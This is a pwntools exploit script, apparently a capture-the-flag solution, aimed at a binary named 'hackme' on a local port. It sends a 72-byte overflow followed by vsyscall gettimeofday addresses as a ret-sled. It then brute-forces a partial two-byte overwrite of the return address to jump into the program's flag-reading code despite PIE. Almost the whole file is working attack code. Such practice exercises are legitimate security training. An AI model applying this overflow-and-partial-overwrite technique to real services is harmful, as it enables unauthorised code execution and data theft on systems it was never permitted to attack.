#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template hackme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('hackme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return remote("localhost", 1514)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

flag = b''
i = 0x00

while True:
    io = start()

    io.recvuntil(b": ")
    # make the program set inlen to 90
    io.sendline(b"0")

    offset = 72
    # vsyscall syscall 0x60
    gettimeoftheday = 0xffffffffff600000

    payload = cyclic_gen().get(72)
    payload += p64(gettimeoftheday) * 2
    # len(payload) == 88 - there are 2 bytes left
    # 0x108b is where reading of the flag begins
    # 0x0000108b      488d356d0300.  lea rsi, [0x000013ff]       ; "r" ; const char *mode
    last_byte = 0x8b
    i %= 0x100
    payload += p16((i << 0x8) + last_byte)
    io.sendline(payload)
    # output:
    # Invalid address 0x555555556161 - we are overriding only last two bytes - we are able to partialy override return address
    try:
        res = io.recvline()
        print(res)
        break
    except:
        i += 0x10
        continue
    finally:
        io.close()

